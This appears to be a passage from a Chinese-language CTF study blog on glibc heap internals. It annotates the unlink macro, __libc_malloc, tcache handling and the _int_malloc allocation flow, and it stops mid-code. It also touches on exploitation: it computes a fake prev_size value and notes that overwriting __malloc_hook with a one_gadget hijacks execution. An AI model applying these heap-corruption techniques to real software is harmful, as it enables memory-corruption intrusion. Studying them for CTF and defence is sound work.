<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line">\</span><br><span class="line">\<span class="comment">/* 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查) */</span>\</span><br><span class="line">    \<span class="comment">/* 1. prev_size 检查 */</span>\</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);            \</span><br><span class="line">    FD = P-&gt;fd;                      \</span><br><span class="line">    BK = P-&gt;bk;                      \</span><br><span class="line">    \</span><br><span class="line">    \<span class="comment">/* 检查 fd 和 bk 指针(双向链表完整性检查) */</span>\</span><br><span class="line">    \<span class="comment">/* 2. 双向链表完整性检查 */</span>\</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))          \</span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);            \</span><br><span class="line">    <span class="keyword">else</span> &#123;                      \</span><br><span class="line">        FD-&gt;bk = BK;                    \</span><br><span class="line">        BK-&gt;fd = FD;<span class="comment">//把自己解除链接，让自己的前一个和后一个相连                   </span></span><br><span class="line">        </span><br><span class="line">          <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))            \</span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;          \</span><br><span class="line">            \</span><br><span class="line">            \<span class="comment">/* largebin 中 next_size 双向链表完整性检查 */</span>\</span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)        \</span><br><span class="line">    || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);   \</span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;              \</span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)              \</span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;          \</span><br><span class="line">                <span class="keyword">else</span> &#123;                    \</span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;            \</span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;            \</span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;            \</span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;            \</span><br><span class="line">                  &#125;                    \</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;                    \</span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;          \</span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;          \</span><br><span class="line">              &#125;                      \</span><br><span class="line">          &#125;                      \</span><br><span class="line">      &#125;                        \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Our fake prev_size will be 0x555555559300 - 0x5555555592a0 = 0x60</p>
<h2 id="lib-malloc-、-int-malloc-）、-lib-free-、malloc-hook详解"><a href="#lib-malloc-、-int-malloc-）、-lib-free-、malloc-hook详解" class="headerlink" title="_lib_malloc() 、_int_malloc(）、_lib_free()、malloc_hook详解"></a>_lib_malloc() 、_int_malloc(）、_lib_free()、malloc_hook详解</h2><p>当我们在应用层调用堆的时候，在glibc中实际上调用的是__libc_malloc函数,但是这个函数也是用来简单封装  _int_malloc()函数的，这个intmalloc才是申请堆的核心函数。</p>
<p>在libmalloc中，它首先通过mallochook全局变量获取一个函数指针，判断这个函数是否为空，这个函数指针指向的函数表示用户自定义的堆分配函数，主要是为了方便用户快速修改该函数并进行测试。</p>
<h4 id="漏洞点："><a href="#漏洞点：" class="headerlink" title="漏洞点："></a>漏洞点：</h4><p>如果这个mallochook被修改，那么就会执行被修改后的函数（one_gadget）。</p>
<h2 id="libmalloc："><a href="#libmalloc：" class="headerlink" title="libmalloc："></a>libmalloc：</h2><p><img src="https://img-blog.csdnimg.cn/20190810082836599.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDUzMjg1,size_16,color_FFFFFF,t_70"></p>
<p>从下面的源码可以看到，先读取__malloc_hook全局变量，然后判断是否有用户自定义的堆分配函数，如果有就执行，不再进行系统的堆分配了(_int_malloc)。</p>
<p><strong>[这里可以直接做个流程图]</strong></p>
<p>如果返回hook是空，则继续下面的操作</p>
<p><img src="https://img-blog.csdnimg.cn/2019081008403339.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDUzMjg1,size_16,color_FFFFFF,t_70"></p>
<p>1.寻找一个arena来试图分配内存（通过arena_get（）函数来寻找arena）</p>
<p>2.执行intmalloc函数申请内存</p>
<p>3.下面if判断如果咱们申请失败了，会再次申请arena和内存</p>
<p>4.如果申请成功了，咱们就在arena中分配内存了，最后退出的时候对申请来的arena解锁。</p>
<p>5.最终返回内存。</p>
<h2 id="int-malloc内部操作"><a href="#int-malloc内部操作" class="headerlink" title="int_malloc内部操作"></a>int_malloc内部操作</h2><p>int_malloc会根据应用层用户申请的内存块大小分配相应的chunk给用户使用。</p>
<h4 id="其主要执行流程："><a href="#其主要执行流程：" class="headerlink" title="其主要执行流程："></a>其主要执行流程：</h4><blockquote>
<p>①请求大小在fastbin的范围内：在fastbins中找是否有对应的chunk可以使用。<br>②请求大小在smallbin的范围内：在smallbin中找是否有对应的chunk可以使用。<br>③请求大小在largebin的范围内：先调用malloc_consolidate对fastbins进行整理。然后在unsortedbin中查看是否有满足要求的chunk可以使用。<br>④在largebin中寻找可用的chunk来使用。<br>⑤寻找较大的bin链中是否有可用的chunk来使用。<br>⑥切割topchunk来使用。<br>⑦topchunk也不够了，再次调用malloc_consolidate整理fastbins。<br>⑧topchunk不够用，再次malloc_consolidate之后还没有可以用的，最终调用sysmalloc（系统调用）申请内存。</p>
</blockquote>
<h4 id="其主要执行流程版本二："><a href="#其主要执行流程版本二：" class="headerlink" title="其主要执行流程版本二："></a>其主要执行流程版本二：</h4><blockquote>
<p>malloc分配步骤大致如下：<br>1.检查有没有_malloc_hook，有则调用hook函数。<br>2.获得分配区的锁，调用函数_int_malloc()分配内存。<br>3.如果申请大小在fast bin范围内，则从fast bin分配chunk，成功则返回用户指针，否则进行下一步。(当对应的bin为空时，就会跳过第5步操作)<br>4.如果申请大小在small bin范围内，则从small bin中分配chunk，成功则返回用户指针，否则进行下一步。<br>5.调用malloc_consolidate()函数合并fast bin，并链接进unsorted bin中。<br>6.如果申请大小在small bin范围内，且此时unsorted bin只有一个chunk，并且这个chunk为last remainder chunk且大小够大，则从这个chunk中切分出需要的大小，成功则返回用户指针，否则进行下一步。<br>7.反向遍历unsorted bin，如果当前chunk与所需chunk大小一致，则分配，成功则返回用户指针，否则将当前chunk放入small bin或者large bin中合适的位置。<br>8.使用最佳匹配算法在large bin中找到合适的chunk进行分配，成功则返回用户指针，否则进行下一步。<br>9.到了这一步，说明没有大小正好合适的chunk，则看看比当前bin的index大的small bin或者large bin中有没有空闲chunk可用来分配。成功则返回用户指针，否则进行下一步。<br>10.尝试从top chunk中分配，成功则返回用户指针，否则进行下一步。<br>11.如果fast bin中还有chunk，调用malloc_consolidate()回到第6步(因为第3步对应bin为空时会跳过第五步，而fast bin合并之后有可能出现能够分配的small bin)。<br>12.到了这步还不行，则调用sYSMALLOc()函数向系统申请  内存。</p>
</blockquote>
<p>这里面没写到tcache的分配是因为libcmalloc的时候就已经把tcache给分配出去了。</p>
<p><a target="_blank" rel="noopener" href="https://shizhongpwn.github.io/2020/01/30/tcache-attack/">https://shizhongpwn.github.io/2020/01/30/tcache-attack/</a>   tcache出现的具体代码段，以及分配流程。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *(*hook) (<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tbytes;</span><br><span class="line">  checked_request2size (bytes, tbytes);</span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (tbytes);</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;<span class="comment">//在这里分配tcache， 检查tcache索引tc_idx是否合法，以及该索引中是否有空闲块。若有，则直接取出并返回给用户</span></span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    &#123;</span><br><span class="line">      victim = _int_malloc (&amp;main_arena, bytes);</span><br><span class="line">      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">	      &amp;main_arena == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">      <span class="keyword">return</span> victim;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//上下判断请求是否由主线程发起，上是main arena（主线程发起的），下把当前线程arena存入ar_ptr中，再调用_int_malloc申请内存块。</span></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;<span class="comment">//再次获取arena锁，然后进入int_malloc分配内存。</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);<span class="comment">//分配完了则释放arena锁</span></span><br><span class="line"></span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__libc_malloc)</span><br><span class="line"></span><br></pre></td></tr></table></figure>




















<h3 id="拥有tcache的工作方式"><a href="#拥有tcache的工作方式" class="headerlink" title="拥有tcache的工作方式"></a>拥有tcache的工作方式</h3><p>第一次malloc,会先申请个堆块存放tcache_prethread_struct</p>
<p>free的堆块先放入tcache(size合适的话)</p>
<ul>
<li>tcache对应链表没满之前，先放入该链表，满了之后才放入fastbin或者unsorted bin这些。</li>
<li>malloc时先从对应tcache中取</li>
<li>tcache 为空时，如果 fastbin/smallbin/unsorted bin 中有 size 符合的 chunk，会先把 fastbin/smallbin/unsorted bin 中的 chunk 放到 tcache 中，直到填满。之后再从 tcache 中取；因此 chunk 在 bin 中和 tcache 中的顺序会反过来</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *</span><br><span class="line">_int_malloc (mstate av, <span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T nb;               <span class="comment">/* normalized request size */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span 